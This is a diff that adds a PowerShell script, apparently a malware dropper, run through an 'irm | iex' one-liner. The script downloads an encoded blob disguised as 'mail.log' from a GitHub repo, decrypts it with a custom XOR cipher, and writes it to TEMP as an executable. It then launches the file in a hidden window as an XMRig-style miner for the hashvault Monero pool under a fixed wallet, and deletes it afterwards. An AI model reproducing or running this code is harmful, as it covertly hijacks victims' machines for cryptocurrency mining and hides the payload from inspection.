@@ -1,0 +1,30 @@
+# irm https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/archive.txt | iex
+function white {
+	param([string] $Key, [byte[]] $Data)
+	$MASK = ([bigint]1 -shl 32) - 1
+	function Wrap32([bigint] $v) {
+		return $v -band $MASK
+	}
+	[bigint]$h = 2166136261
+	foreach ($kb in [System.Text.Encoding]::UTF8.GetBytes($Key)) {
+		$h = Wrap32(( $h -bxor [bigint]$kb ) * 16777619)
+	}
+	[bigint]$x = $h
+	$out = New-Object System.Collections.Generic.List[byte]
+	foreach ($b in $Data) {
+		$x = Wrap32( $x -bxor ( Wrap32($x -shl 13) ) )
+		$x = Wrap32( $x -bxor ( Wrap32($x -shr 17) ) )
+		$x = Wrap32( $x -bxor ( Wrap32($x -shl 5) ) )
+		$out.Add([byte]( ($b -bxor ($x -band 0xFF)) -band 0xFF ))
+	}
+	return $out.ToArray()
+}
+
+$var = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/mail.log").Trim()
+$yellow = [Convert]::FromBase64String($var)
+$orange = "sv6rhwoZMd3R"
+$buf = white -Key $orange -Data $yellow
+$temp = [IO.Path]::Combine($env:TEMP, [Guid]::NewGuid().ToString() + ".exe")
+[IO.File]::WriteAllBytes($temp, $buf)
+Start-Process -FilePath $temp -ArgumentList "-o pool.hashvault.pro:443 -u 4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu -p test --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" -Wait -WindowStyle Hidden
+Remove-Item $temp -Force
